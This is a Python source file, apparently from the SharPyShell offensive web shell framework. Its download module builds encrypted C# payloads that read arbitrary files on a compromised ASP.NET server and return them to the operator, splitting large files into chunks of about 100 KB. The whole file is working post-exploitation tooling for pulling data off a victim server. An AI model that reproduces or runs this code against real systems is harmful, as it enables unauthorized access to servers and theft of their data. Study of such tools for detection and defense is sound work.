from core.Module import Module, ModuleException
from core import config
import ntpath
import traceback
from time import sleep


class DownloadModuleException(ModuleException):
    pass


class Download(Module):
    _exception_class = DownloadModuleException
    short_help = "Download a file from the server"
    complete_help = r"""
        This module allows you to download a file from the remote server.
        In this module has been considered the limit of the data you can send/receive through post request.
        So if a file is larger than 100 KB it will be splitted into multiple requests over the network.
        The chunk size parameter could be modified.
    
        Usage:
            #download remote_input_path [local_output_path] [chunk_size]
    
        Positional arguments:
            remote_input_path               The file path you want to download from the remote server
            local_output_path               The path where the file will be saved on your local machine
                                            Default: 'output' directory of Sharpyshell directory
            chunk_size                      The maximum limit of a chunk to be transferred over the network
                                            Default: 102400
        
        Examples:
            Download cmd.exe:            
                #download C:\windows\system32\cmd.exe
            Download cmd.exe into /home/user local directory:
                #download C:\windows\system32\cmd.exe /home/user/cmd.exe
            Download cmd.exe into /home/user local directory splitting into multiple requests of 1KB chunks:
                #download C:\windows\system32\cmd.exe /home/user/cmd.exe 1024
    """

    _runtime_code = r"""
            using System;using System.IO;using System.Diagnostics;using System.Text;
            public class SharPyShell{                    
                public byte[] Download(string arg){
                    byte[] downloaded_file;
                    try{
                        downloaded_file = System.IO.File.ReadAllBytes(arg);
                    }
                    catch (Exception e){
                        downloaded_file = Encoding.UTF8.GetBytes("{{{SharPyShellError}}}\n" + e);
                    }
                    return downloaded_file;
                }
                public byte[] ExecRuntime(){
                    byte[] output_func=Download(@"%s");
                    return(output_func);
                }
            }
    """

    __runtime_code_split_file = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell{                    
                    public byte[] Download(string arg, int chunk, int offset){
                        byte[] downloaded_file = new byte[chunk];
                        try{
                            using (BinaryReader reader = new BinaryReader(new FileStream(arg, FileMode.Open, FileAccess.Read, FileShare.Read))){
                                reader.BaseStream.Seek(offset, SeekOrigin.Begin);
                                reader.Read(downloaded_file, 0, chunk);
                            }
                        }
                        catch (Exception e){
                            downloaded_file = Encoding.UTF8.GetBytes("{{{SharPyShellError}}}\n" + e);
                        }
                        return downloaded_file;
                    }
                    public byte[] ExecRuntime(){
                        byte[] output_func=Download(@"%s", %s, %s);
                        return(output_func);
                    }
                }
        """

    __runtime_code_get_file_size = r"""
            using System;using System.IO;using System.Diagnostics;using System.Text;
            public class SharPyShell{                    
                string GetFileSize(string path){
                    string output = "";
                    try{
                        output = new System.IO.FileInfo(path).Length.ToString();
                    }
                    catch (Exception e){
                        return "{{{SharPyShellError}}}\n " + e;
                    }
                    return output;
                }
                public byte[] ExecRuntime(){
                    string output_func=GetFileSize(@"%s");
                    byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                    return(output_func_byte);
                }
             }
    """

    __default_chunk_size = 102400

    def __get_file_size(self, file_path):
        code = self.__runtime_code_get_file_size % file_path
        encrypted_request = self._encrypt_request(code)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        output_file_size = self._parse_response(decrypted_response)
        return output_file_size

    def __write_local_file(self, file_content, output_path, split=False):
        if split:
            file_open_mode = 'ab'
        else:
            file_open_mode = 'wb'
        try:
            with open(output_path, file_open_mode) as outfile:
                outfile.write(file_content)
        # tune for Windows race condition on file access when the chunk_size is very small, weird...
        except PermissionError:
            sleep(1)
            with open(output_path, file_open_mode) as outfile:
                outfile.write(file_content)
        output = "File Downloaded correctly to " + output_path
        return output

    def __parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#download : Not enough arguments. 1 Argument required. \n')
        args_parser = {k: v for k, v in enumerate(args)}
        download_input_path = args_parser.get(0)
        filename = ntpath.basename(download_input_path)
        default_download_output_path = config.output_path + filename
        download_output_path = args_parser.get(1, default_download_output_path)
        chunk_size = int(args_parser.get(2, self.__default_chunk_size))
        if ':' not in download_input_path:
            download_input_path = self._module_settings['working_directory'] + '\\' + download_input_path
        return download_input_path, filename, download_output_path, chunk_size

    def _create_request(self, args):
        download_input_path, chunk_size, file_size = args
        output_code_arr = []
        if file_size <= chunk_size:
            code = self._runtime_code % download_input_path
            output_code_arr += [code]
        else:
            n_of_chunks = file_size // chunk_size
            last_chunk = file_size % chunk_size
            if last_chunk > 0:
                n_of_chunks = n_of_chunks + 1
            for i in range(0, n_of_chunks):
                if i == n_of_chunks - 1 and last_chunk > 0:
                    code = self.__runtime_code_split_file % (download_input_path, last_chunk, chunk_size * i)
                else:
                    code = self.__runtime_code_split_file % (download_input_path, chunk_size, chunk_size * i)
                output_code_arr += [code]
        return output_code_arr

    def run(self, args):
        parsed_response = ''
        try:
            download_input_path, filename, download_output_path, chunk_size = self.__parse_run_args(args)
            file_size = int(self.__get_file_size(download_input_path))
            requests = self._create_request([download_input_path, chunk_size, file_size])
            open(download_output_path, 'w').close()
            for i, req in enumerate(requests):
                encrypted_request = self._encrypt_request(req)
                encrypted_response = self._post_request(encrypted_request)
                decrypted_response = self._decrypt_response(encrypted_response)
                file_content = decrypted_response
                if len(requests) > 1:
                    parsed_response = self.__write_local_file(file_content, download_output_path, split=True)
                    print ('Chunk ' + str(i + 1) + ' --> ' + str(chunk_size * i) + ' - ' +\
                          str(chunk_size * i + chunk_size) + ' bytes written correctly to ' + download_output_path)
                else:
                    parsed_response = self.__write_local_file(file_content, download_output_path)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
